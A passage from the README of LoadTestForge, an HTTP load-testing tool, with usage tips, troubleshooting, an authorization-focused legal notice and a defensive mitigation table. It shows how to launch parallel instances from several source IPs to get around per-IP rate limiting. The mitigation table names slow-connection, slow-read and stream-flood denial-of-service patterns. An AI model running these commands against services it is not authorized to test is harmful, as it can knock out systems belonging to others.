./loadtest --target http://api.com --sessions 1000 --rate 100 --rampup 30s --duration 5m
```

### 4. Combine with Target Monitoring

While running LoadTestForge, monitor your target:
- CPU/Memory usage
- Response times
- Error rates
- Database connections
- Network bandwidth

### 5. Use Multi-IP for High Session Counts

```bash
# If single IP plateaus at 2,400 sessions
./loadtest --target http://api.com --sessions 5000 --rate 500
# Actual: 2,400 sessions (IP rate limited)

# Solution: Distribute across multiple IPs
for i in {1..7}; do
    ./loadtest --target http://api.com --sessions 2000 --bind-ip 192.168.1.10$i &
done
# Actual: 14,000 sessions (2,000 × 7)
```

## Troubleshooting

### High p99 values

**Problem:** `p99 >> p50` indicates tail latency issues.

**Solutions:**
- Check target server resources
- Reduce load (`--rate`)
- Increase timeout (`--timeout 30s`)

### "Too many open files"

**Solution:**
```bash
# Linux/Mac
ulimit -n 65536

# Docker
Add to docker-compose.yml:
ulimits:
  nofile:
    soft: 65536
    hard: 65536
```

### Sessions plateau below target

**Problem:** Can't exceed 2,000-3,000 sessions on single IP.

**Diagnosis:**
```bash
netstat -s | grep -i reset
# High reset count = IP rate limiting
```

**Solution:**
```bash
# Use multiple source IPs
./loadtest --bind-ip 192.168.1.101 --sessions 2000 &
./loadtest --bind-ip 192.168.1.102 --sessions 2000 &
# ...
```

### Invalid bind IP error

**Problem:** `Error: invalid bind IP: 192.168.1.999`

**Solution:**
```bash
# Verify IP is assigned to a network interface
ip addr show | grep 192.168.1

# Only use IPs that appear in the output
```

### Ramp-up not smooth

**Problem:** Load increases in steps instead of smooth curve.

**Cause:** Normal behavior. Manager checks every 100ms.

**Solution:** Use longer ramp-up for smoother curves:
```bash
# Instead of
--rampup 10s

# Use
--rampup 1m
```

## Development

### Run Tests

```bash
make test
```

### Build for Linux

```bash
make build-linux
```

### Format Code

```bash
make fmt
```

## License

MIT License

## Legal Notice & Responsible Use

### Authorized Use Only

This tool is designed for **legitimate security testing and performance validation**. You MUST have explicit authorization before testing any system.

### Required Before Testing

| Requirement | Description |
|-------------|-------------|
| **Written Authorization** | Obtain documented permission from system owner |
| **Scope Definition** | Clearly define target systems, timeframes, and test limits |
| **Stakeholder Notification** | Inform IT, security, and operations teams |
| **Staging First** | Always validate in non-production environments first |
| **Incident Response Plan** | Have rollback and emergency contact procedures ready |

### Prohibited Use

- Testing systems without explicit authorization
- Targeting third-party infrastructure (CDNs, cloud providers) without permission
- Disrupting production services without proper change management
- Using this tool for malicious purposes or competitive harm

### Compliance

Users are responsible for compliance with:
- Local computer crime laws (CFAA, Computer Misuse Act, 정보통신망법, etc.)
- Industry regulations (PCI-DSS, HIPAA, SOC2 testing requirements)
- Cloud provider acceptable use policies (AWS, GCP, Azure)
- Corporate security policies

### Liability

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND. THE AUTHORS AND COPYRIGHT HOLDERS SHALL NOT BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY ARISING FROM THE USE OF THIS SOFTWARE. Users assume full responsibility for ensuring authorized and legal use.

## Defensive Recommendations

If you're testing your own infrastructure, here are recommended mitigations for each load pattern:

| Pattern | Mitigation |
|---------|------------|
| Slow Connection | Configure aggressive connection timeouts (30-60s) |
| Slow POST | Implement request body timeouts |
| Slow Read | Set response send timeouts |
| High Throughput | Rate limiting, WAF rules, CDN |
| HTTP/2 Streams | Configure MAX_CONCURRENT_STREAMS limits |
| Parser Stress | Input validation, depth limits, regex timeout |
| Connection Pool | Connection limits per IP, firewall rules |

## Future Plans

- [ ] **Web Dashboard** - Real-time metrics visualization with live graphs
- [ ] **Distributed Execution** - Controller/worker architecture for multi-node load generation
- [ ] **Report Export** - HTML/JSON test reports with charts and summary

## Contributing

Pull requests welcome! Please:
1. Add tests for new features
2. Update documentation
3. Follow existing code style
4. Run `make fmt` before committing
